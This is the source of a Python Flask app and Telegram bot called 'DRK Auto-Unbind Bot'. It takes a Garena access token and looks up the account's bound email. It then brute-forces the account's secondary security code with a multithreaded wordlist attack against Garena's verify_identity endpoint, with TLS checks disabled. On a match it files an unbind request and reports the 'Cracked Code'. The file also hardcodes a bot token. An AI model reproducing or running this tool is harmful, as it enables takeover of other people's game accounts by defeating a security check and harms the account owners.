# app.py
import os
import hashlib
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, request
import telebot
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "8992557359:AAHehU2QqZVuPBeqrjNUCc7qYA1_vKuZZs0"
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

@app.route(f'/{BOT_TOKEN}', methods=['POST'])
def webhook():
    json_string = request.get_data().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

@app.route('/')
def index():
    return "DRK Auto-Bind Telegram Bot is active and running on Render!"

def run_unbind_process(access_token):
    if not os.path.exists("HLO.txt"):
        return "Error: 'HLO.txt' file not found on the server! Please upload HLO.txt via Telegram."
    
    try:
        url_info = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        info_payload = {'app_id': "100067", 'access_token': access_token}
        info_headers = {'User-Agent': "GarenaMSDK/4.0.30"}
        r_info = requests.get(url_info, params=info_payload, headers=info_headers, timeout=20, verify=False)
        res_json = r_info.json()
        email = res_json.get("email", "")
    except Exception as e:
        return f"Error connecting to Garena: {str(e)}"
        
    if not email:
        return "No bound email found or invalid access token provided."

    try:
        with open("HLO.txt", "r", encoding="utf-8", errors="ignore") as f:
            codes = [line.strip() for line in f if line.strip()]
    except Exception as e:
        return f"Failed to read HLO.txt: {str(e)}"

    headers = {
        "User-Agent": "GarenaMSDK/4.0.30",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }

    def test_single_code(code):
        hashed_sec_code = hashlib.sha256(code.encode('utf-8')).hexdigest()
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        verify_data = {
            "email": email, 
            "app_id": "100067", 
            "access_token": access_token, 
            "secondary_password": hashed_sec_code
        }
        try:
            resp = requests.post(verify_url, headers=headers, data=verify_data, timeout=8, verify=False)
            res_json = resp.json()
            if "identity_token" in res_json and res_json.get("identity_token"):
                return code, res_json.get("identity_token")
        except Exception:
            pass
        return None, None

    identity_token = None
    matched_code = None

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(test_single_code, code): code for code in codes}
        
        for future in as_completed(futures):
            code, token = future.result()
            if token:
                matched_code = code
                identity_token = token
                for f in futures:
                    f.cancel()
                break

    if not identity_token or not matched_code:
        return f"Verification failed! No code matched from HLO.txt for email: {email}"

    unbind_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
    unbind_data = {"app_id": "100067", "access_token": access_token, "identity_token": identity_token}
    
    try:
        final_resp = requests.post(unbind_url, headers=headers, data=unbind_data, timeout=10, verify=False)
        server_response = final_resp.text
    except Exception as e:
        server_response = f"Request failed: {str(e)}"

    return (
        f"✅ **UNBIND SUCCESSFUL!**\n\n"
        f"📧 **Email:** `{email}`\n"
        f"🔑 **Cracked Code:** `{matched_code}`\n"
        f"🌐 **Server Response:** `{server_response}`"
    )

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(
        message, 
        "Welcome to DRK Auto-Unbind Bot!\n\n"
        "• Send `/unbind <your_access_token>` to run the process.\n"
        "• **Upload any `.txt` file directly here** to update your `HLO.txt` on the server.", 
        parse_mode="Markdown"
    )

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    try:
        # File info fetch karein
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Server par HLO.txt ke naam se save kar dein
        with open("HLO.txt", 'wb') as new_file:
            new_file.write(downloaded_file)
            
        bot.reply_to(message, "✅ **HLO.txt** successfully updated and saved on the server!", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to update HLO.txt: {str(e)}")

@bot.message_handler(commands=['unbind'])
def handle_unbind(message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Please provide your access token.\nExample: `/unbind YOUR_ACCESS_TOKEN`", parse_mode="Markdown")
        return
    
    access_token = parts[1].strip()
    sent_msg = bot.reply_to(message, "⚙️ Processing unbind request using HLO.txt... Please wait.")
    
    result = run_unbind_process(access_token)
    bot.edit_message_text(result, chat_id=message.chat.id, message_id=sent_msg.message_id, parse_mode="Markdown")

if __name__ == '__main__':
    PORT = int(os.environ.get('PORT', 5000))
    RENDER_URL = os.environ.get('RENDER_EXTERNAL_URL')
    
    if RENDER_URL:
        bot.remove_webhook()
        bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")
        
    app.run(host='0.0.0.0', port=PORT)
    
